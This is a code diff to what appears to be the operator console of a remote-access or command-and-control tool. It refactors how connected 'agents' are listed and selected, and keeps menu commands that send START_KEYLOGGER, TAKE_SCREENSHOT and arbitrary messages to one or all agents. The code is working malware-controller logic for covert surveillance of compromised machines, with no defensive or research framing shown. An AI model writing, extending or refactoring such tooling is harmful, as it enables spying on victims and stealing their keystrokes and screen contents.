@@ -140,8 +140,8 @@ def terminal(args):
         if not agents:
             logger.info("No agents connected.")
         else:
-            for addr in agents.keys():
-                logger.info(f"- {addr}")
+            for i, agent in enumerate(agents, 1):
+                logger.info(f"{i}. {agent.addr}")
 
     def keylogger_command():
         agents = agent_tool.get_agents()
@@ -151,20 +151,19 @@ def terminal(args):
         
         # Show available agents
         logger.info("Available agents:")
-        for i, addr in enumerate(agents.keys(), 1):
-            logger.info(f"{i}. {addr}")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
         
         try:
             choice = input("Select agent number (or 'all' for all agents): ").strip()
             if choice.lower() == 'all':
-                for addr in agents.keys():
-                    agent_tool.send_msg_by_rhost(addr, "START_KEYLOGGER")
-                    logger.info(f"Keylogger command sent to {addr}")
+                for agent in agents:
+                    agent_tool.send_str(agent, "START_KEYLOGGER")
+                    logger.info(f"Keylogger command sent to {agent.addr}")
             else:
-                agent_list = list(agents.keys())
-                selected_addr = agent_list[int(choice) - 1]
-                agent_tool.send_msg_by_rhost(selected_addr, "START_KEYLOGGER")
-                logger.info(f"Keylogger command sent to {selected_addr}")
+                selected_agent = agents[int(choice) - 1]
+                agent_tool.send_str(selected_agent, "START_KEYLOGGER")
+                logger.info(f"Keylogger command sent to {selected_agent.addr}")
         except (ValueError, IndexError):
             logger.error("Invalid selection.")
 
@@ -176,20 +175,19 @@ def terminal(args):
         
         # Show available agents
         logger.info("Available agents:")
-        for i, addr in enumerate(agents.keys(), 1):
-            logger.info(f"{i}. {addr}")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
         
         try:
             choice = input("Select agent number (or 'all' for all agents): ").strip()
             if choice.lower() == 'all':
-                for addr in agents.keys():
-                    agent_tool.send_msg_by_rhost(addr, "TAKE_SCREENSHOT")
-                    logger.info(f"Screenshot command sent to {addr}")
+                for agent in agents:
+                    agent_tool.send_str(agent, "TAKE_SCREENSHOT")
+                    logger.info(f"Screenshot command sent to {agent.addr}")
             else:
-                agent_list = list(agents.keys())
-                selected_addr = agent_list[int(choice) - 1]
-                agent_tool.send_msg_by_rhost(selected_addr, "TAKE_SCREENSHOT")
-                logger.info(f"Screenshot command sent to {selected_addr}")
+                selected_agent = agents[int(choice) - 1]
+                agent_tool.send_str(selected_agent, "TAKE_SCREENSHOT")
+                logger.info(f"Screenshot command sent to {selected_agent.addr}")
         except (ValueError, IndexError):
             logger.error("Invalid selection.")
 
@@ -201,17 +199,16 @@ def terminal(args):
         
         # Show available agents
         logger.info("Available agents:")
-        for i, addr in enumerate(agents.keys(), 1):
-            logger.info(f"{i}. {addr}")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
         
         try:
             choice = input("Select agent number: ").strip()
-            agent_list = list(agents.keys())
-            selected_addr = agent_list[int(choice) - 1]
+            selected_agent = agents[int(choice) - 1]
             
             custom_msg = input("Enter message to send: ").strip()
-            agent_tool.send_msg_by_rhost(selected_addr, custom_msg)
-            logger.info(f"Message '{custom_msg}' sent to {selected_addr}")
+            agent_tool.send_str(selected_agent, custom_msg)
+            logger.info(f"Message '{custom_msg}' sent to {selected_agent.addr}")
         except (ValueError, IndexError):
             logger.error("Invalid selection.")
 
